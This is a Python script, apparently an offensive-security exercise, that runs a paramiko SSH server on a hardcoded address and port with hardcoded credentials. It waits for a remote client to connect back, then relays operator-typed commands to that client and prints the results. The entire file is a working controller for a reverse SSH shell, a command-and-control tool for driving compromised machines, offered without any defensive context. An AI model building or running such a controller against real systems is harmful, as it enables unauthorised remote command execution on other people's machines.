# -*- coding: utf-8 -*-
import os
import paramiko
import socket
import sys
import threading


# 获取当前所在的路径
CWD = os.path.dirname(os.path.realpath(__file__))
# 密钥文件
HOSTKEY = paramiko.RSAKey(filename=os.path.join(CWD, "test_rsa.key"))
print(HOSTKEY)

class Server(paramiko.ServerInterface):
    def __init__(self):
        # 创建线程事件管理
        self.event = threading.Event()

    def check_channel_request(self, kind, chanid):
        ''' 认证成功后打开频道 '''
        if kind == "session":
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def check_auth_password(self, username, password):
        ''' 检查账号密码 '''
        if (username == "PQ") and (password == "Icelandk0928"):
            return paramiko.AUTH_SUCCESSFUL


if __name__ == '__main__':
    server = "192.168.16.105"
    ssh_port = 25565
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((server, ssh_port))
        sock.listen(100)
        print("[+] 监听连接 ...")
        client, addr = sock.accept()
    except Exception as e:
        print("[-] 监听失败: " + str(e))
        sys.exit(1)
    else:
        print("[+] 成功联系上!", client, addr)

    bhSession = paramiko.Transport(client)
    bhSession.add_server_key(HOSTKEY)
    server = Server()
    bhSession.start_server(server=server)

    chan = bhSession.accept(20)
    if chan is None:
        print("*** 无通信.")
        sys.exit(1)

    print("[+] 通过验证!")
    print(chan.recv(1024))
    chan.send("Welcome to iceland_ssh")
    try:
        while True:
            command = input("输入命令: ")
            if command != "exit":
                chan.send(command)
                r = chan.recv(8192)
                print(r.decode())
            else:
                chan.send("终止.")
                print("退出.")
                bhSession.close()
                break
    except Exception as e:
        bhSession.close()
